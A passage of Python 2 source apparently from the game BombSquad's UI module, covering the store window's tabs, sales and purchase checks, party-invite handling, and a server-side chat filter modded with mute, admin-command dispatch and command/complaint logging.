                color=(0.35, 0.3, 0.4),
                selectable=False,
                textColor=(0.55, 0.5, 0.6),
                label=bs.Lstr(resource='getTicketsWindow.restorePurchasesText'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height - 44),
            size=(0, 0),
            color=gTitleColor, scale=1.5, hAlign="center", vAlign="center",
            text=bs.Lstr(resource='storeText'),
            maxWidth=420)

        if not self._modal and gDoAndroidNav:
            bs.buttonWidget(
                edit=self._backButton, buttonType='backSmall', size=(60, 60),
                label=bs.getSpecialChar('back'))

        scrollBufferH = 130 + 2*xInset
        tabBufferH = 250 + 2*xInset

        tabsDef = [['extras', bs.Lstr(resource=self._r+'.extrasText')],
                   ['maps', bs.Lstr(resource=self._r+'.mapsText')],
                   ['minigames', bs.Lstr(resource=self._r+'.miniGamesText')],
                   ['characters', bs.Lstr(resource=self._r+'.charactersText')],
                   ['icons', bs.Lstr(resource=self._r+'.iconsText')]]

        tabResults = _createTabButtons(
            self._rootWidget, tabsDef,
            pos=(tabBufferH * 0.5, self._height - 130),
            size=(self._width - tabBufferH, 50),
            onSelectCall=self._setTab, returnExtraInfo=True)

        self._purchasableCountWidgets = {}

        # create our purchasable-items tags and have them update over time..
        for i, tab in enumerate(tabsDef):
            pos = tabResults['positions'][i]
            size = tabResults['sizes'][i]
            button = tabResults['buttonsIndexed'][i]
            rad = 10
            center = (pos[0]+0.1*size[0], pos[1]+0.9*size[1])
            img = bs.imageWidget(
                parent=self._rootWidget,
                position=(center[0] - rad * 1.04, center[1] - rad * 1.15),
                size=(rad * 2.2, rad * 2.2),
                texture=bs.getTexture('circleShadow'),
                color=(1, 0, 0))
            txt = bs.textWidget(
                parent=self._rootWidget, position=center, size=(0, 0),
                hAlign='center', vAlign='center', maxWidth=1.4 * rad, scale=0.6,
                shadow=1.0, flatness=1.0)
            rad = 20
            saleImg = bs.imageWidget(
                parent=self._rootWidget,
                position=(center[0] - rad, center[1] - rad),
                size=(rad * 2, rad * 2),
                drawController=button, texture=bs.getTexture('circleZigZag'),
                color=(0.5, 0, 1.0))
            saleTitleText = bs.textWidget(
                parent=self._rootWidget,
                position=(center[0],
                          center[1] + 0.24 * rad),
                size=(0, 0),
                hAlign='center', vAlign='center', drawController=button,
                maxWidth=1.4 * rad, scale=0.6, shadow=0.0, flatness=1.0,
                color=(0, 1, 0))
            saleTimeText = bs.textWidget(
                parent=self._rootWidget,
                position=(center[0],
                          center[1] - 0.29 * rad),
                size=(0, 0),
                hAlign='center', vAlign='center', drawController=button,
                maxWidth=1.4 * rad, scale=0.4, shadow=0.0, flatness=1.0,
                color=(0, 1, 0))
            self._purchasableCountWidgets[tab[0]] = {
                'img': img,
                'text': txt,
                'saleImg': saleImg,
                'saleTitleText': saleTitleText,
                'saleTimeText': saleTimeText}
        self._tabUpdateTimer = bs.Timer(
            1000, bs.WeakCall(self._updateTabs),
            timeType='real', repeat=True)
        self._updateTabs()

        self._tab_buttons = tabResults['buttons']

        if self._getTicketsButton is not None:
            lastTabButton = self._tab_buttons[tabsDef[-1][0]]
            bs.widget(edit=self._getTicketsButton, downWidget=lastTabButton)
            bs.widget(
                edit=lastTabButton, upWidget=self._getTicketsButton,
                rightWidget=self._getTicketsButton)

        self._scrollWidth = self._width-scrollBufferH
        self._scrollHeight = self._height-180

        self._scrollWidget = None
        self._status_text_widget = None
        self._restore_state()

    def _restorePurchases(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
        else:
            bsInternal._restorePurchases()

    def _updateTabs(self):
        if not self._rootWidget.exists():
            return
        for tabName, tabData in self._purchasableCountWidgets.items():
            saleTime = _getAvailableSaleTime(tabName)

            if saleTime is not None:
                bs.textWidget(edit=tabData['saleTitleText'],
                              text=bs.Lstr(resource='store.saleText')
                              )
                bs.textWidget(
                    edit=tabData['saleTimeText'],
                    text=bsUtils.getTimeString(saleTime, centi=False))
                bs.imageWidget(edit=tabData['saleImg'], opacity=1.0)
                count = 0
            else:
                bs.textWidget(edit=tabData['saleTitleText'], text='')
                bs.textWidget(edit=tabData['saleTimeText'], text='')
                bs.imageWidget(edit=tabData['saleImg'], opacity=0.0)
                count = _getAvailablePurchaseCount(tabName)

            if count > 0:
                bs.textWidget(edit=tabData['text'], text=str(count))
                bs.imageWidget(edit=tabData['img'], opacity=1.0)
            else:
                bs.textWidget(edit=tabData['text'], text='')
                bs.imageWidget(edit=tabData['img'], opacity=0.0)

    def _updateTicketsText(self):
        if not self._rootWidget.exists():
            return
        if bsInternal._getAccountState() == 'SIGNED_IN':
            s = bs.getSpecialChar(
                'ticket')+str(bsInternal._getAccountTicketCount())
        else:
            s = bs.Lstr(resource='getTicketsWindow.titleText')
        bs.buttonWidget(edit=self._getTicketsButton, label=s)

    def _setTab(self, tab):

        if self._current_tab == tab:
            return
        self._current_tab = tab

        # we wanna preserve our current tab between runs
        bs.getConfig()['Store Tab'] = tab
        bs.writeConfig()

        # update tab colors based on which is selected
        _updateTabButtonColors(self._tab_buttons, tab)

        # (re)create scroll widget
        if self._scrollWidget is not None and self._scrollWidget.exists():
            self._scrollWidget.delete()

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            position=((self._width-self._scrollWidth)*0.5,
                      self._height-self._scrollHeight-79-48),
            size=(self._scrollWidth, self._scrollHeight))

        # stop updating anything that was there
        self._buttonInfos = {}
        self._updateButtonsTimer = None

        # so we can still select root level widgets with controllers
        bs.containerWidget(
            edit=self._scrollWidget, claimsLeftRight=True, claimsTab=True,
            selectionLoopToParent=True)

        # show status over top..
        if (self._status_text_widget is not None
                and self._status_text_widget.exists()):
            self._status_text_widget.delete()
        self._status_text_widget = bs.textWidget(
            parent=self._rootWidget,
            position=(self._width * 0.5, self._height * 0.5),
            size=(0, 0),
            color=(1, 0.7, 1, 0.5),
            hAlign="center", vAlign="center", text=bs.Lstr(
                resource=self._r + '.loadingText'),
            maxWidth=self._scrollWidth * 0.9)

        class _Request(object):
            def __init__(self, window):
                self._window = weakref.ref(window)
                data = {'tab': tab}
                bs.realTimer(100, bs.WeakCall(self._onResponse, data))

            def _onResponse(self, data):
                window = self._window()
                if window is not None and (window._request is self):
                    window._request = None
                    window._onResponse(data)

        # kick off a server request
        self._request = _Request(self)

    # actually start the purchase locally..
    def _purchaseCheckResult(self, item, isTicketPurchase, result):
        if result is None:
            bs.playSound(bs.getSound('error'))
            bs.screenMessage(
                bs.Lstr(resource='internal.unavailableNoConnectionText'),
                color=(1, 0, 0))
        else:
            if isTicketPurchase:
                if result['allow']:
                    price = bsInternal._getAccountMiscReadVal(
                        'price.' + item, None)
                    if price is None or type(price) not in (
                            int, long) or price <= 0:
                        print 'Error; got invalid local price of', price,\
                            'for item', item
                        bs.playSound(bs.getSound('error'))
                    else:
                        bs.playSound(bs.getSound('click01'))
                        bsInternal._inGamePurchase(item, price)
                else:
                    if result['reason'] == 'versionTooOld':
                        bs.playSound(bs.getSound('error'))
                        bs.screenMessage(
                            bs.Lstr(
                                resource='getTicketsWindow.versionTooOldText'),
                            color=(1, 0, 0))
                    else:
                        bs.playSound(bs.getSound('error'))
                        bs.screenMessage(
                            bs.Lstr(
                                resource='getTicketsWindow.unavailableText'),
                            color=(1, 0, 0))
            # real in-app purchase
            else:
                if result['allow']:
                    bsInternal._purchase(item)
                else:
                    if result['reason'] == 'versionTooOld':
                        bs.playSound(bs.getSound('error'))
                        bs.screenMessage(
                            bs.Lstr(
                                resource='getTicketsWindow.versionTooOldText'),
                            color=(1, 0, 0))
                    else:
                        bs.playSound(bs.getSound('error'))
                        bs.screenMessage(
                            bs.Lstr(
                                resource='getTicketsWindow.unavailableText'),
                            color=(1, 0, 0))

    def _doPurchaseCheck(self, item, isTicketPurchase=False):
        # here we ping the server to ask if it's valid for us to purchase this..
        # (better to fail now than after we've paid locally)
        env = bs.getEnvironment()
        bsUtils.serverGet(
            'bsAccountPurchaseCheck',
            {'item': item, 'platform': env['platform'],
             'subplatform': env['subplatform'],
             'version': env['version'],
             'buildNumber': env['buildNumber'],
             'purchaseType': 'ticket' if isTicketPurchase else 'real'},
            callback=bs.WeakCall(
                self._purchaseCheckResult, item, isTicketPurchase))

    def _buy(self, item):
        # prevent pressing buy within a few seconds of the last press
        # (gives the buttons time to disable themselves and whatnot)
        t = bs.getRealTime()
        if t - self._lastBuyTime < 2000:
            bs.playSound(bs.getSound('error'))
        else:
            if bsInternal._getAccountState() != 'SIGNED_IN':
                showSignInPrompt()
            else:
                # pros is an actual IAP; the rest are ticket purchases.
                if item == 'pro':
                    bs.playSound(bs.getSound('click01'))
                    self._lastBuyTime = t
                    # purchase either pro or pro_sale depending on whether
                    # there is a sale going on..
                    self._doPurchaseCheck(
                        'pro'
                        if _getAvailableSaleTime('extras') is None else
                        'pro_sale')
                else:
                    # def doIt():
                    self._lastBuyTime = t
                    price = bsInternal._getAccountMiscReadVal(
                        'price.' + item, None)
                    ourTickets = bsInternal._getAccountTicketCount()
                    if price is not None and ourTickets < price:
                        bs.playSound(bs.getSound('error'))
                        showGetTicketsPrompt()
                    else:
                        def doIt():
                            self._doPurchaseCheck(item, isTicketPurchase=True)
                        bs.playSound(bs.getSound('swish'))
                        ConfirmWindow(
                            bs.Lstr(
                                resource='store.purchaseConfirmText',
                                subs=[('${ITEM}',
                                       _getStoreItemNameTranslated(item))]),
                            width=400, height=120, action=doIt, okText=bs.Lstr(
                                resource='store.purchaseText',
                                fallbackResource='okText'))

    def _printAlreadyOwn(self, charName):
        bs.screenMessage(
            bs.Lstr(
                resource=self._r + '.alreadyOwnText',
                subs=[('${NAME}', charName)]),
            color=(1, 0, 0))
        bs.playSound(bs.getSound('error'))

    def _updateButtons(self):
        if not self._rootWidget.exists():
            return
        import datetime
        salesRaw = bsInternal._getAccountMiscReadVal('sales', {})
        sales = {}
        try:
            # look at the current set of sales; filter any with time remaining..
            for saleItem, saleInfo in salesRaw.items():
                toEnd = (datetime.datetime.utcfromtimestamp(
                    saleInfo['e']) - datetime.datetime.utcnow()).total_seconds()
                if toEnd > 0:
                    sales[saleItem] = {'toEnd': toEnd,
                                       'originalPrice': saleInfo['op']}
        except Exception:
            bs.printException("Error parsing sales")

        for bType, bInfo in self._buttonInfos.items():

            if bType in ['upgrades.pro', 'pro']:
                purchased = bsUtils._havePro()
            else:
                purchased = bsInternal._getPurchased(bType)

            saleOpacity = 0.0
            saleTitleText = ''
            saleTimeText = ''

            if purchased:
                titleColor = (0.8, 0.7, 0.9, 1.0)
                color = (0.63, 0.55, 0.78)
                extraImageOpacity = 0.5
                call = bs.WeakCall(self._printAlreadyOwn, bInfo['name'])
                priceText = ''
                priceTextLeft = ''
                priceTextRight = ''
                showPurchaseCheck = True
                descriptionColor = (0.4, 1.0, 0.4, 0.4)
                descriptionColor2 = (0.0, 0.0, 0.0, 0.0)
                priceColor = (0.5, 1, 0.5, 0.3)
            else:
                titleColor = (0.7, 0.9, 0.7, 1.0)
                color = (0.4, 0.8, 0.1)
                extraImageOpacity = 1.0
                call = bInfo['call'] if 'call' in bInfo else None
                if bType in ['upgrades.pro', 'pro']:
                    saleTime = _getAvailableSaleTime('extras')
                    if saleTime is not None:
                        price = bsInternal._getPrice('pro')
                        priceTextLeft = price if price is not None else '?'
                        price = bsInternal._getPrice('pro_sale')
                        priceTextRight = price if price is not None else '?'
                        saleOpacity = 1.0
                        priceText = ''
                        saleTitleText = bs.Lstr(resource='store.saleText')
                        saleTimeText = bs.getTimeString(saleTime, centi=False)
                    else:
                        price = bsInternal._getPrice('pro')
                        priceText = price if price is not None else '?'
                        priceTextLeft = ''
                        priceTextRight = ''
                    # if price is None: priceText = '??'
                    # else: priceText = price
                else:
                    price = bsInternal._getAccountMiscReadVal('price.'+bType, 0)
                    # color button differently if we cant afford this
                    if bsInternal._getAccountState() == 'SIGNED_IN':
                        if bsInternal._getAccountTicketCount() < price:
                            color = (0.6, 0.61, 0.6)
                    priceText = bs.getSpecialChar(
                        'ticket')+str(bsInternal._getAccountMiscReadVal(
                            'price.'+bType, '?'))
                    priceTextLeft = ''
                    priceTextRight = ''

                    # TESTING:
                    if bType in sales:
                        saleOpacity = 1.0
                        priceTextLeft = bs.getSpecialChar(
                            'ticket')+str(sales[bType]['originalPrice'])
                        priceTextRight = priceText
                        priceText = ''
                        saleTitleText = bs.Lstr(resource='store.saleText')
                        saleTimeText = bs.getTimeString(
                            int(sales[bType]['toEnd']*1000), centi=False)

                descriptionColor = (0.5, 1, 0.5)
                descriptionColor2 = (0.3, 1, 1)
                # priceColor = (1,0.5,0.0,1.0)
                priceColor = (0.2, 1, 0.2, 1.0)
                showPurchaseCheck = False

            if 'titleText' in bInfo:
                bs.textWidget(edit=bInfo['titleText'], color=titleColor)
            if 'purchaseCheck' in bInfo:
                bs.imageWidget(
                    edit=bInfo['purchaseCheck'],
                    opacity=1.0 if showPurchaseCheck else 0.0)
            if 'priceWidget' in bInfo:
                bs.textWidget(
                    edit=bInfo['priceWidget'],
                    text=priceText, color=priceColor)
            if 'priceWidgetLeft' in bInfo:
                bs.textWidget(edit=bInfo['priceWidgetLeft'], text=priceTextLeft)
            if 'priceWidgetRight' in bInfo:
                bs.textWidget(
                    edit=bInfo['priceWidgetRight'],
                    text=priceTextRight)
            if 'priceSlashWidget' in bInfo:
                bs.imageWidget(
                    edit=bInfo['priceSlashWidget'],
                    opacity=saleOpacity)
            if 'saleBGWidget' in bInfo:
                bs.imageWidget(edit=bInfo['saleBGWidget'], opacity=saleOpacity)
            if 'saleTitleWidget' in bInfo:
                bs.textWidget(edit=bInfo['saleTitleWidget'], text=saleTitleText)
            if 'saleTimeWidget' in bInfo:
                bs.textWidget(edit=bInfo['saleTimeWidget'], text=saleTimeText)
            if 'button' in bInfo:
                bs.buttonWidget(
                    edit=bInfo['button'],
                    color=color, onActivateCall=call)
            if 'extraBackings' in bInfo:
                for b in bInfo['extraBackings']:
                    bs.imageWidget(edit=b, color=color,
                                   opacity=extraImageOpacity)
            if 'extraImages' in bInfo:
                for b in bInfo['extraImages']:
                    bs.imageWidget(edit=b, opacity=extraImageOpacity)
            if 'extraTexts' in bInfo:
                for b in bInfo['extraTexts']:
                    bs.textWidget(edit=b, color=descriptionColor)
            if 'extraTexts2' in bInfo:
                for b in bInfo['extraTexts2']:
                    bs.textWidget(edit=b, color=descriptionColor2)
            if 'descriptionText' in bInfo:
                bs.textWidget(
                    edit=bInfo['descriptionText'],
                    color=descriptionColor)

    def _onResponse(self, data):

        # clear status text..
        if (self._status_text_widget is not None
                and self._status_text_widget.exists()):
            self._status_text_widget.delete()
            self._status_text_widgetUpdateTimer = None

        if data is None:
            self._status_text_widget = bs.textWidget(
                parent=self._rootWidget,
                position=(self._width * 0.5, self._height * 0.5),
                size=(0, 0),
                scale=1.3, transitionDelay=100, color=(1, 0.3, 0.3, 1.0),
                hAlign="center", vAlign="center", text=bs.Lstr(
                    resource=self._r + '.loadErrorText'),
                maxWidth=self._scrollWidth * 0.9)
        else:
            class _Store(object):

                def __init__(self, storeWindow, data, width):

                    self._storeWindow = storeWindow
                    self._width = width
                    self._rows = []
                    storeData = _getStoreLayout()

                    self._tab = data['tab']
                    self._sections = copy.deepcopy(storeData[data['tab']])

                    # pre-calc a few things and add them to store-data
                    for section in self._sections:
                        if self._tab == 'characters':
                            dummyName = 'characters.foo'
                        elif self._tab == 'extras':
                            dummyName = 'pro'
                        elif self._tab == 'maps':
                            dummyName = 'maps.foo'
                        elif self._tab == 'icons':
                            dummyName = 'icons.foo'
                        else:
                            dummyName = ''
                        section['buttonSize'] = _getStoreItemDisplaySize(
                            dummyName)
                        section['vSpacing'] = (-17 if self._tab ==
                                               'characters' else 0)
                        if 'title' not in section:
                            section['title'] = ''
                        section['xOffs'] = (130 if self._tab == 'extras'
                                            else 270 if self._tab == 'maps'
                                            else 0)
                        section['yOffs'] = (55 if (self._tab == 'extras'
                                                   and gSmallUI) else -20
                                            if self._tab == 'icons' else 0)

                def instantiate(self, scrollWidget, tabButton):

                    titleSpacing = 40
                    buttonBorder = 20
                    buttonSpacing = 4
                    # buttonVSpacing = -10
                    buttonOffsetH = 40

                    self._height = 80

                    # calc total height
                    for i, section in enumerate(self._sections):
                        if section['title'] != '':
                            self._height += titleSpacing
                        bWidth, bHeight = section['buttonSize']
                        bColumnCount = int(
                            math.floor(
                                (self._width - buttonOffsetH - 20) /
                                (bWidth + buttonSpacing)))
                        bRowCount = int(
                            math.ceil(
                                float(len(section['items'])) / bColumnCount))
                        bHeightTotal = 2*buttonBorder+bRowCount * \
                            bHeight+(bRowCount-1)*section['vSpacing']
                        self._height += bHeightTotal

                    c = bs.containerWidget(
                        parent=scrollWidget, scale=1.0,
                        size=(self._width, self._height),
                        background=False)
                    bs.containerWidget(
                        edit=c, claimsLeftRight=True, claimsTab=True,
                        selectionLoopToParent=True)
                    v = self._height - 20

                    if self._tab == 'characters':
                        t = bs.Lstr(
                            resource='store.howToSwitchCharactersText',
                            subs=[('${SETTINGS}', bs.Lstr(
                                resource='accountSettingsWindow.titleText')),
                                ('${PLAYER_PROFILES}', bs.Lstr(
                                    resource='playerProfilesWindow.titleText')
                                )])
                        bs.textWidget(
                            parent=c, text=t, size=(0, 0),
                            position=(self._width * 0.5, self._height - 28),
                            hAlign='center', vAlign='center',
                            color=(0.7, 1, 0.7, 0.4),
                            scale=0.7, shadow=0, flatness=1.0, maxWidth=700,
                            transitionDelay=400)
                    elif self._tab == 'icons':
                        t = bs.Lstr(
                            resource='store.howToUseIconsText',
                            subs=[('${SETTINGS}', bs.Lstr(
                                resource='mainMenu.settingsText')),
                                ('${PLAYER_PROFILES}', bs.Lstr(
                                    resource='playerProfilesWindow.titleText')
                                )])
                        bs.textWidget(
                            parent=c, text=t, size=(0, 0),
                            position=(self._width * 0.5, self._height - 28),
                            hAlign='center', vAlign='center',
                            color=(0.7, 1, 0.7, 0.4),
                            scale=0.7, shadow=0, flatness=1.0, maxWidth=700,
                            transitionDelay=400)
                    elif self._tab == 'maps':
                        t = bs.Lstr(resource='store.howToUseMapsText')
                        bs.textWidget(
                            parent=c, text=t, size=(0, 0),
                            position=(self._width * 0.5, self._height - 28),
                            hAlign='center', vAlign='center',
                            color=(0.7, 1, 0.7, 0.4),
                            scale=0.7, shadow=0, flatness=1.0, maxWidth=700,
                            transitionDelay=400)

                    prevRowButtons = None
                    thisRowButtons = []

                    delay = 300
                    for section in self._sections:
                        if section['title'] != '':
                            bs.textWidget(
                                parent=c, position=(60, v - titleSpacing * 0.8),
                                size=(0, 0),
                                scale=1.0, transitionDelay=delay,
                                color=(0.7, 0.9, 0.7, 1),
                                hAlign="left", vAlign="center", text=bs.Lstr(
                                    resource=section['title']),
                                maxWidth=self._width * 0.7)
                            v -= titleSpacing
                        delay = max(100, delay-100)
                        v -= buttonBorder
                        bWidth, bHeight = section['buttonSize']
                        bCount = len(section['items'])
                        bColumnCount = int(
                            math.floor(
                                (self._width - buttonOffsetH - 20) /
                                (bWidth + buttonSpacing)))
                        col = 0
                        for i, itemName in enumerate(section['items']):

                            item = self._storeWindow._buttonInfos[itemName] = {}
                            item['call'] = bs.WeakCall(
                                self._storeWindow._buy, itemName)

                            if 'xOffs' in section:
                                bOffsH2 = section['xOffs']
                            else:
                                bOffsH2 = 0

                            if 'yOffs' in section:
                                bOffsV2 = section['yOffs']
                            else:
                                bOffsV2 = 0

                            bPos = (
                                buttonOffsetH + bOffsH2 +
                                (bWidth + buttonSpacing) * col, v - bHeight +
                                bOffsV2)

                            _instantiateStoreItemDisplay(
                                itemName, item, parentWidget=c, bPos=bPos,
                                buttonOffsetH=buttonOffsetH, bWidth=bWidth,
                                bHeight=bHeight, bOffsH2=bOffsH2,
                                bOffsV2=bOffsV2, delay=delay)
                            b = item['button']

                            delay = max(100, delay-100)
                            thisRowButtons.append(b)

                            # wire this button to the equivalent in the
                            # previous row
                            if prevRowButtons is not None:
                                if len(prevRowButtons) > col:
                                    bs.widget(
                                        edit=b, upWidget=prevRowButtons[col])
                                    bs.widget(
                                        edit=prevRowButtons[col],
                                        downWidget=b)
                                    # if we're the last button in our row,
                                    # wire any in the previous row past
                                    # our position to go to us if down is
                                    # pressed
                                    if col+1 == bColumnCount or i == bCount-1:
                                        for bPrev in prevRowButtons[col+1:]:
                                            bs.widget(edit=bPrev, downWidget=b)
                                else:
                                    bs.widget(
                                        edit=b, upWidget=prevRowButtons[-1])
                            else:
                                bs.widget(edit=b, upWidget=tabButton)

                            col += 1
                            if col == bColumnCount or i == bCount-1:
                                prevRowButtons = thisRowButtons
                                thisRowButtons = []
                                col = 0
                                v -= bHeight
                                if i < bCount-1:
                                    v -= section['vSpacing']

                        v -= buttonBorder

                    # set a timer to update these buttons periodically as long
                    # as we're alive (so if we buy one it will grey out, etc)
                    self._storeWindow._updateButtonsTimer = bs.Timer(
                        500, bs.WeakCall(self._storeWindow._updateButtons),
                        repeat=True, timeType='real')
                    # also update them immediately
                    self._storeWindow._updateButtons()

            if self._current_tab in (
                    'extras', 'minigames', 'characters', 'maps', 'icons'):
                store = _Store(self, data, self._scrollWidth)
                store.instantiate(scrollWidget=self._scrollWidget,
                                  tabButton=self._tab_buttons
                                  [self._current_tab])
            else:
                c = bs.containerWidget(
                    parent=self._scrollWidget, scale=1.0,
                    size=(self._scrollWidth, self._scrollHeight*0.95),
                    background=False)
                bs.containerWidget(
                    edit=c, claimsLeftRight=True, claimsTab=True,
                    selectionLoopToParent=True)
                self._status_text_widget = bs.textWidget(
                    parent=c,
                    position=(self._scrollWidth * 0.5, self._scrollHeight *
                              0.5),
                    size=(0, 0),
                    scale=1.3, transitionDelay=100, color=(1, 1, 0.3, 1.0),
                    hAlign="center", vAlign="center", text=bs.Lstr(
                        resource=self._r + '.comingSoonText'),
                    maxWidth=self._scrollWidth * 0.9)

    def _save_state(self):
        try:
            sel = self._rootWidget.getSelectedChild()
            if sel == self._getTicketsButton:
                selName = 'GetTickets'
            elif sel == self._scrollWidget:
                selName = 'Scroll'
            elif sel == self._backButton:
                selName = 'Back'
            elif sel in self._tab_buttons.values():
                selName = 'Tab:' + self._tab_buttons.keys()[
                    self._tab_buttons.values().index(sel)]
            else:
                raise Exception("unrecognized selection")
            gWindowStates[self.__class__.__name__] = {
                'selName': selName, 'tab': self._current_tab}
        except Exception:
            bs.printException('error saving state for', self.__class__)

    def _restore_state(self):
        try:
            try:
                selName = gWindowStates[self.__class__.__name__]['selName']
            except Exception:
                selName = None
            try:
                current_tab = bs.getConfig()['Store Tab']
            except Exception:
                current_tab = None
            if self._show_tab is not None:
                current_tab = self._show_tab
            if current_tab is None or current_tab not in self._tab_buttons:
                current_tab = 'characters'
            if selName == 'GetTickets':
                sel = self._getTicketsButton
            elif selName == 'Back':
                sel = self._backButton
            elif selName == 'Scroll':
                sel = self._scrollWidget
            elif type(selName) is str and selName.startswith('Tab:'):
                sel = self._tab_buttons[selName.split(':')[-1]]
            else:
                sel = self._tab_buttons[current_tab]
            # if we were requested to show a tab, select it too..
            if (self._show_tab is not None
                    and self._show_tab in self._tab_buttons):
                sel = self._tab_buttons[self._show_tab]
            self._setTab(current_tab)
            bs.containerWidget(edit=self._rootWidget, selectedChild=sel)
        except Exception:
            bs.printException('error restoring state for', self.__class__)

    def _on_get_more_tickets_press(self):
        if bsInternal._getAccountState() != 'SIGNED_IN':
            showSignInPrompt()
            return
        self._save_state()
        bs.containerWidget(edit=self._rootWidget, transition='outLeft')
        window = GetTicketsWindow(
            fromModalStore=self._modal,
            storeBackLocation=self._backLocation).getRootWidget()
        if not self._modal:
            uiGlobals['mainMenuWindow'] = window

    def _back(self):
        self._save_state()
        bs.containerWidget(edit=self._rootWidget,
                           transition=self._transitionOut)
        if not self._modal:
            if self._backLocation == 'CoopWindow':
                uiGlobals['mainMenuWindow'] = CoopWindow(
                    transition='inLeft').getRootWidget()
            else:
                uiGlobals['mainMenuWindow'] = MainMenuWindow(
                    transition='inLeft').getRootWidget()
        if self._onCloseCall is not None:
            self._onCloseCall()


# Called for *all* chat messages while hosting.
# Messages originating from the host will have clientID -1.
# Should filter and return the string to be displayed,
# or return None to ignore the message.
def _filterChatMessage(msg, clientID):
    
    if not msg or not msg.strip():
        return None
    import filter
    import membersID as MID
    import getPermissionsHashes as gph
    import bsServerData as internals
    import settings
    import fire
    def roles(clientID):
        client = ''
        name = ''
        for i in bsInternal._getForegroundHostActivity().players:
            if i.getInputDevice().getClientID()==clientID:
                client=i.get_account_id()
                name=i.getName()
        return client
        return name
    replacement_chars = ['!', '@', '*', '^', '$','#']
    for word in filter.f_words:
        if word in msg.lower():
            filter.check_id(clientID)
            filter.k(clientID)
            filter.warn(clientID)
            filter.check(clientID)
            replacement = ''.join(random.choice(replacement_chars) for _ in word)
            msg = msg.replace(word, replacement)
            return msg
    if settings.enableCoinSystem:
	import coinSystem
	if msg.lower() == coinSystem.correctAnswer:
		coinSystem.checkAnswer(msg,clientID)
		return msg
    for i in bsInternal._getForegroundHostActivity().players:
        if i.getInputDevice().getClientID()==clientID:
            name=i.getName()
            client=i.get_account_id()
            if client in MID.muted:
                msg = None
                bs.screenMessage('You are muted sir!', color=(-3,2,4), clients=[clientID], transient=True)
                return msg
     
    else:    
         #will add chat logger or chatfilter here

        if True:
            if msg.startswith('?'):
                import cheatCmd
                cheatCmd.cmnd(msg,clientID)
                for i in bsInternal._getForegroundHostActivity().players:
                    if i.getInputDevice().getClientID()==clientID:
                        client=i.get_account_id()
                        name=i.getName()
                        import datetime
                        now = datetime.datetime.now()
                        f = open("cmdlog.txt", "a")
                        f.write(name+' - '+client+' used command --> '+msg+' @ '+now.strftime("%Y-%m-%d %H:%M:%S")+'\n')
                        f.close()
                ##msg = u'\ue048'
                return None
            if msg.startswith('/'):
                import chatCmd
                chatCmd.cmd(msg,clientID)
                for i in bsInternal._getForegroundHostActivity().players:
                    if i.getInputDevice().getClientID()==clientID:
                        client=i.get_account_id()
                        name=i.getName()
                        import datetime
                        now = datetime.datetime.now()
                        f = open("cmdlog.txt", "a")
                        f.write(name+' - '+client+' used command --> '+msg+' @ '+now.strftime("%Y-%m-%d %H:%M:%S")+'\n')
                        f.close()
                #msg = u'\ue048'
                return None
            if 'comp' in msg:
                for i in bsInternal._getForegroundHostActivity().players:
                    if i.getInputDevice().getClientID()==clientID:
                        client=i.get_account_id()
                        name=i.getName()
                        import datetime
                        now = datetime.datetime.now()
                        f = open("complaints.txt", "a")
                        f.write(name+' - '+client+' gave complaint --> '+msg+' @ '+now.strftime("%Y-%m-%d %H:%M:%S")+'\n')# advanced complaint system. better than chat cmd one.
                        f.close()
                        bs.screenMessage('Complaint has been sent to owner! --> '+name, color=(-3,2,4), clients=[clientID], transient=True)
                return msg         
            if msg in ['.','!','@','#','^','*','+','_','-']:
                for i in bsInternal._getForegroundHostActivity().players:
                    if i.getInputDevice().getClientID()==clientID:
                        client=i.get_account_id()
                        name=i.getName()
                        bs.screenMessage('Hello! --> '+name+' --> '+client, color=(-3,2,4), clients=[clientID], transient=True)
                msg = None
                return None
            else:
                return msg


# Called for local chat messages when the party window is up.
def _handleLocalChatMessage(msg):
    global gPartyWindow
    if gPartyWindow is not None and gPartyWindow() is not None:
        gPartyWindow().onChatMessage(msg)


def _handleGainedTickets(count):
    bs.screenMessage(
        bs.Lstr(
            resource='getTicketsWindow.receivedTicketsText',
            subs=[('${COUNT}', str(count))]),
        color=(0, 1, 0))
    bs.playSound(bs.getSound('cashRegister'))


gInviteConfirmWindows = []


def _handlePartyInvite(name, inviteID):
    import bsMainMenu
    bs.playSound(bs.getSound('fanfare'))

    # if we're not in the main menu, just print the invite
    # (don't want to screw up an in-progress game)
    inGame = not isinstance(
        bsInternal._getForegroundHostSession(),
        bsMainMenu.MainMenuSession)
    if inGame:
        bs.screenMessage(
            bs.Lstr(
                value='${A}\n${B}',
                subs=[('${A}', bs.Lstr(
                    resource='gatherWindow.partyInviteText',
                    subs=[('${NAME}', name)])),
                    ('${B}', bs.Lstr(
                        resource='gatherWindow.partyInviteGooglePlayExtraText')
                    )]),
            color=(0.5, 1, 0))
    else:
        def do_accept(inviteID):
            bsInternal._acceptPartyInvitation(inviteID)
        c = ConfirmWindow(
            bs.Lstr(
                resource='gatherWindow.partyInviteText',
                subs=[('${NAME}', name)]),
            bs.Call(do_accept, inviteID),
            width=500, height=150, color=(0.75, 1.0, 0.0),
            okText=bs.Lstr(resource='gatherWindow.partyInviteAcceptText'),
            cancelText=bs.Lstr(
                resource='gatherWindow.partyInviteIgnoreText'))

        # lets store the invite-id away on the confirm window so we know if
        # we need to kill it later
        c._partyInviteID = inviteID

        # store a weak-ref so we can get at this later
        global gInviteConfirmWindows
        gInviteConfirmWindows.append(weakref.ref(c))

        # go ahead and prune our weak refs while we're here.
        gInviteConfirmWindows = [
            w for w in gInviteConfirmWindows if w() is not None]


def _handlePartyInviteRevoke(inviteID):

    # if there's a confirm window up for joining this particular invite, kill it
    global gInviteConfirmWindows
    for ww in gInviteConfirmWindows:
        w = ww()
        if w is not None and w._partyInviteID == inviteID:
            bs.containerWidget(edit=w.getRootWidget(), transition='outRight')


class FileSelectorWindow(Window):

    def __init__(
            self, path, callback=None, showBasePath=True,
        validFileExtensions=[],
            allowFolders=False):
        self._width = 700 if gSmallUI else 600
        self._xInset = xInset = 50 if gSmallUI else 0
        self._height = 365 if gSmallUI else 418
        self._callback = callback
        self._basePath = path
        self._path = None
        self._recentPaths = []
        self._showBasePath = showBasePath
        self._validFileExtensions = ['.'+ext for ext in validFileExtensions]
        self._allowFolders = allowFolders

        self._scrollWidth = self._width-(80+2*xInset)
        self._scrollHeight = self._height-170
        self._r = 'fileSelectorWindow'
        self._rootWidget = bs.containerWidget(
            size=(self._width, self._height),
